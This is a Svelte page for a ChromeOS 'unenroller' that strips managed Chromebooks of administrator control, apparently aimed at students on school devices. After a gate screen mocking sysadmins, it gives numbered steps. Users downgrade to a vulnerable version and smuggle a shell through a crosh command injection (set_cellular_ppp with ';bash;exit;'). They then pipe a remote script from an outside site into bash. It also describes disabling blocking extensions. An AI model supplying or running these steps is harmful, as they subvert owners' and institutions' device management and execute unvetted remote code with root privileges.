<script lang="ts">
  import Background from "../components/Background.svelte";
  import TopBar from "../components/TopBar.svelte";
  import SelectButton from "../components/SelectButton.svelte";

  let selected: null | "101" | "91" | "81" | "87";
  let confirmed = false;

  let paramString = window.location.toString().split("?")[1];
  let queryString = new URLSearchParams(paramString);
</script>

{#if !confirmed}
  <div class="flex flex-col items-center darkm2" id="popup">
    <p class="text text-xl">SYSADMINS AND/OR SKIDS READING THIS</p>
    <p class="text">kindly leave the page</p>

    <div class="flex-1" />
    <div class="flex">
      <SelectButton
        click={() => (confirmed = true)}
        text="i can be trusted with powerful exploits"
      />
      <SelectButton
        click={() =>
          window.location.replace(
            "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
          )}
        text="i am a useless member of society"
      />
    </div>
  </div>
{:else}
  <main class="dark flex flex-col">
    <div class="no-select opacity-10">
      <Background forceScript={2} />
    </div>
    <!-- <div class = "hidden"> -->
    <TopBar title="UNROLL - CHROMEOS UNENROLLER" askForNotifs={false} />
    <!-- </div> -->

    <p class="text-center text text-md flex items-center w-full">
      WARNING! THIS SCRIPT WILL FULLY TAKE YOUR CHROMEBOOK OUT OF MANAGEMENT.<br
      />
      BY RUNNING ANY SCRIPTS FROM HERE YOU ACKNOWLEGE THAT YOU PERSONALLY OWN YOUR
      DEVICE OR HAVE PERMISSION TO BE RUNNING THIS SCRIPT<br />
      THE PROCESS IS REVERSIBLE, BUT I AM NOT RESPONSIBLE FOR ANY TROUBLE YOU MAY
      GET INTO WITH YOUR ADMINISTRATORS, OR BY YOU DOING THIS WRONG AND BRICKING
      YOUR CHROMEBOOK<br />

      IF YOU DON'T HAVE AT LEAST A BASIC UNDERSTANDING OF BASH<br />
    </p>
    <p class="text-center text-xl w-full text-red-600 flex items-center">
      TURN BACK NOW!!!!
    </p>
    <br />
    <div class="scroll-y opacity-90 darkp1 flex-1">
      <p class="flex items-center w-full text-center text text-lg">
        Method Select
      </p>
      <br />
      <p class="flex items-center w-full text-center text text-md">
        Some methods may be blocked by your administrator or be non functional.
        If so, choose another one
      </p>
      <div class="flex justify-center items-center">
        <SelectButton
          click={() => (selected = "101")}
          text="ShRootV101 - CROSH"
        />
        <SelectButton
          click={() => (selected = "87")}
          text="ShRootV87 - CROSH"
        />
        <SelectButton
          click={() => (selected = "91")}
          text="ShRootV91 - CROSH"
        />
        <SelectButton click={() => (selected = "81")} text="Shill Breakout" />
      </div>
      {#if selected != null}
        <div class="text p-5 flex justify-center flex-col">
          <!-- <pre> -->
          <p class="text text-lg">
            In order for this exploit to work you will need to downgrade to
            EXACTLY version {selected}.<br /> Downgrade instructions can be
            found
            <a href="https://chrome100.dev">here</a>
          </p>
          {#if selected == "101" || selected == "91" || selected == "87"}
            This method requires crosh to be unblocked on your chromebook.<br />
            Crosh can be opened with CTRL+ALT+T<br />
            If it's blocked by an extension, you can disable it with LTBEEF<br/>
            {#if selected == "91"}
              v91 WILL NOT WORK ON GRUNT BOARDS
            {/if}
            {#if selected == "87"}
              v91 WILL NOT WORK ON GRUNT BOARDS
            {/if}

            STEPS:

            <ol class="p-3">
              <li>Open crosh (ctrl + alt + t)</li>
              <li>
                Type in <pre>set_cellular_ppp \';bash;exit;\'</pre>
                and enter
              </li>
              <li>
                Type in <pre>bash &lt;(curl https://coolelectronics.me/unroll)</pre>
                and enter
              </li>
              <li>
                Wait for the script to finish, then powerwash your chromebook
              </li>
            </ol>

            <br />
          {:else if selected == "81"}
            WORK IN PROGRESS
          {/if}
          <p class="text text-lg">
            Steps to Re-Enroll when you turn your chromebook back in at the end
            of the year:
          </p>
          <ol class="p-3">
            <li>
              Enable DevMode (ESC+Power+Reload, ctrl d and enter on recovery
              screen)
            </li>
            <li>Once in chrome, Open crosh (ctrl + alt + t)</li>
            <li>
              Type in <pre>shell</pre>
            </li>
            <li>
              Type in <pre>sudo vpd -i RW_VPD -s check_enrollment=1</pre>
            </li>
            <li>Powerwash again</li>
          </ol>
          <!-- </pre> -->
        </div>
        <br /><br /><br />
        <p class="text text-sm">
          Site made by CoolElectronics#4683<br />
          UNROLL (U Need Root LoL) acroynm by Bideos#1850 and zuh#6098<br />
          justinchrm#3399 helped with testing<br />
          Shroot™ name by phennen#9801<br />
          Root exploits originally found by Rory McNamara
        </p>
      {/if}
    </div>
  </main>
{/if}

<style>
  #popup {
    /* position: fixed; */
    height: 100vh;
    width: 100vw;
    /* left: 50%; */
    /* top: 50%; */
    /* transform: translate(-50%, -50%); */
  }
  .scroll-y {
    overflow-y: scroll;
    position: relative;
  }
  main {
    overflow: hidden;
  }
  a {
    color: lightskyblue;
  }
  * {
    user-select: none;
  }
  p {
    display: inline-block;
    /* user-select: all; */
  }
  pre {
    user-select: all;
    display: inline;
  }
  .no-select {
    pointer-events: none;
    user-select: none;
    /* z-index: -2; */
  }
</style>
